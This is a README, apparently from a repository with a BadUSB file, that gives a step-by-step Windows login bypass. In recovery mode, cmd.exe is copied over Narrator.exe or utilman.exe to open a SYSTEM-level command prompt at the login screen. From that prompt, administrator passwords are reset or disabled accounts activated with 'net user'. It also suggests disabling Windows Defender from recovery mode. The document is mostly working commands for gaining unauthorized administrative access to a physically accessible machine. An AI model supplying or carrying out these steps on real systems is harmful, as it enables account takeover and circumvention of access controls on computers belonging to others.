# Windows Password Reset via Narrator Exploit

## ***TXT file in this repository is a badusb file --> Automatic use for Phases 3 and 4***


**Phase 1: Access Recovery Mode**

From the Windows login screen:

Hold SHIFT + Click on "Restart" (power icon in bottom right corner)


**Phase 2: Open Command Prompt**

Navigate through:
Troubleshoot > Advanced Options > Command Prompt
**Select *admin* account if prompted**


**Phase 3: Identify System Drive**

## Windows is not always on C: in recovery mode
```cmd
diskpart
list volume
exit
```

Identify the volume with "Windows" or "System" (often D: in recovery)
We'll assume it's D: for this example


**Phase 4: Backup and Replace Narrator**

*Verify correct drive*
```cmd
dir D:\Windows\System32\Narrator.exe
```

*Backup original Narrator*
```cmd
copy D:\Windows\System32\Narrator.exe D:\Windows\System32\Narrator.bak
```

*Replace with cmd.exe*
```cmd
copy D:\Windows\System32\cmd.exe D:\Windows\System32\Narrator.exe
```

*Verify replacement*
```cmd
dir D:\Windows\System32\Narrator.*
```


**Phase 5: Reboot System**
```cmd
wpeutil reboot
```
*Or simply close and restart normally*

**Phase 6: Launch Narrator (Login Screen)**

*From the login screen:*
Win + Ctrl + Enter
*A CMD prompt running as SYSTEM will open*


**Phase 7: Change Administrator Password**
*List all accounts*
```cmd
net user
```

*Change password (replace "Administrator" with actual account name)*
```cmd
net user Administrator NewP@ssw0rd
```

*Or activate a disabled account and change its password*
```cmd
net user Administrator /active:yes
net user Administrator NewP@ssw0rd
```


**Phase 8: Cleanup (Optional but Recommended)**
*Restore original Narrator*
```cmd
copy C:\Windows\System32\Narrator.bak C:\Windows\System32\Narrator.exe
```

# Delete backup
```cmd
del C:\Windows\System32\Narrator.bak
```

## Important Notes

Drive letters change in recovery mode (C: often becomes D:, etc.)
Adapt paths according to your list volume output
This technique works on Windows 7 through Windows 11
The CMD runs with SYSTEM privileges (highest level)

## Alternative: Utilman.exe
You can also replace utilman.exe (Ease of Access button) instead of Narrator:
copy D:\Windows\System32\utilman.exe D:\Windows\System32\utilman.bak
copy D:\Windows\System32\cmd.exe D:\Windows\System32\utilman.exe
Then click the Ease of Access icon on login screen to get CMD.


# Troubleshooting
If Narrator doesn't launch:

Verify the replacement was successful
Check you're using the correct drive letter
Ensure you rebooted after replacement

If "Access Denied" errors:

You need to be in recovery Command Prompt (not logged in Windows)
Try disabling Windows Defender/AV from recovery mode first








